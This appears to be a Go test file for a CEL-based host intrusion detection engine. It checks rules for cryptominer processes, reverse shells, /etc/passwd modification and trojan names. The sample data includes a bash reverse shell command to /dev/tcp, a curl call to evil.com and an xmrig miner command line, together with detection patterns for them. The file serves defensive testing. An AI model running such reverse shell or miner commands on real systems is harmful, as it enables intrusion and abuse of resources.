package celengine

import (
	"testing"

	"github.com/imkerbos/mxsec-platform/internal/server/model"
)

// TestBuildActivation 测试 buildActivation 构建 CEL 求值变量
func TestBuildActivation(t *testing.T) {
	fields := map[string]string{
		"exe":     "/usr/bin/curl",
		"cmdline": "curl http://evil.com",
		"pid":     "1234",
	}
	act := buildActivation(3000, fields)

	// data_type 应为 int64
	if dt, ok := act["data_type"].(int64); !ok || dt != 3000 {
		t.Errorf("data_type = %v, want 3000", act["data_type"])
	}

	// 提供的字段应正确映射
	if act["exe"] != "/usr/bin/curl" {
		t.Errorf("exe = %v, want /usr/bin/curl", act["exe"])
	}
	if act["cmdline"] != "curl http://evil.com" {
		t.Errorf("cmdline = %v, want curl http://evil.com", act["cmdline"])
	}

	// 未提供的字段应默认为空字符串
	if act["hostname"] != "" {
		t.Errorf("hostname = %v, want empty string", act["hostname"])
	}
	if act["remote_addr"] != "" {
		t.Errorf("remote_addr = %v, want empty string", act["remote_addr"])
	}
}

// TestCompileAndEval 测试 CEL 表达式编译和求值
func TestCompileAndEval(t *testing.T) {
	env, err := newCELEnv()
	if err != nil {
		t.Fatalf("newCELEnv 失败: %v", err)
	}

	e := &Engine{env: env}

	tests := []struct {
		name       string
		expression string
		dataType   int32
		fields     map[string]string
		wantMatch  bool
	}{
		{
			name:       "挖矿进程检测",
			expression: `exe.contains("xmrig") || cmdline.contains("stratum+tcp")`,
			dataType:   3000,
			fields: map[string]string{
				"exe":     "/tmp/xmrig",
				"cmdline": "/tmp/xmrig --pool stratum+tcp://pool.example.com:3333",
			},
			wantMatch: true,
		},
		{
			name:       "挖矿进程 - 不匹配",
			expression: `exe.contains("xmrig") || cmdline.contains("stratum+tcp")`,
			dataType:   3000,
			fields: map[string]string{
				"exe":     "/usr/bin/curl",
				"cmdline": "curl https://example.com",
			},
			wantMatch: false,
		},
		{
			name:       "反弹 shell 检测",
			expression: `cmdline.contains("/dev/tcp") || cmdline.contains("bash -i")`,
			dataType:   3000,
			fields: map[string]string{
				"exe":     "/bin/bash",
				"cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			},
			wantMatch: true,
		},
		{
			name:       "高危文件修改",
			expression: `file_path == "/etc/passwd" && file_action == "modified"`,
			dataType:   6001,
			fields: map[string]string{
				"file_path":   "/etc/passwd",
				"file_action": "modified",
			},
			wantMatch: true,
		},
		{
			name:       "data_type 条件",
			expression: `data_type == 3000 && exe != ""`,
			dataType:   3000,
			fields: map[string]string{
				"exe": "/bin/bash",
			},
			wantMatch: true,
		},
		{
			name:       "data_type 不匹配",
			expression: `data_type == 3000 && exe != ""`,
			dataType:   6001,
			fields: map[string]string{
				"exe": "/bin/bash",
			},
			wantMatch: false,
		},
		{
			name:       "威胁名称检测",
			expression: `threat_name.contains("Trojan")`,
			dataType:   7001,
			fields: map[string]string{
				"threat_name": "Win.Trojan.Agent-12345",
			},
			wantMatch: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			program, err := e.compile(tt.expression)
			if err != nil {
				t.Fatalf("编译表达式失败: %v", err)
			}

			activation := buildActivation(tt.dataType, tt.fields)
			out, _, err := program.Eval(activation)
			if err != nil {
				t.Fatalf("求值失败: %v", err)
			}

			got := out.Value() == true
			if got != tt.wantMatch {
				t.Errorf("匹配结果 = %v, want %v", got, tt.wantMatch)
			}
		})
	}
}

// TestCompileInvalidExpression 测试无效表达式编译失败
func TestCompileInvalidExpression(t *testing.T) {
	env, err := newCELEnv()
	if err != nil {
		t.Fatalf("newCELEnv 失败: %v", err)
	}

	e := &Engine{env: env}

	tests := []struct {
		name       string
		expression string
	}{
		{"语法错误", `exe ==`},
		{"返回类型不是 bool", `exe + "test"`},
		{"未定义变量", `unknown_var == "test"`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := e.compile(tt.expression)
			if err == nil {
				t.Error("期望编译失败，但成功了")
			}
		})
	}
}

// TestDetectionRuleMatchesDataType 测试 DataType 匹配逻辑
func TestDetectionRuleMatchesDataType(t *testing.T) {
	tests := []struct {
		name      string
		dataTypes model.StringArray
		dataType  int32
		want      bool
	}{
		{"空 DataTypes 匹配所有", nil, 3000, true},
		{"匹配", model.StringArray{"3000", "3001"}, 3000, true},
		{"不匹配", model.StringArray{"3000", "3001"}, 6001, false},
		{"单值匹配", model.StringArray{"7001"}, 7001, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := &model.DetectionRule{DataTypes: tt.dataTypes}
			got := rule.MatchesDataType(tt.dataType)
			if got != tt.want {
				t.Errorf("MatchesDataType(%d) = %v, want %v", tt.dataType, got, tt.want)
			}
		})
	}
}
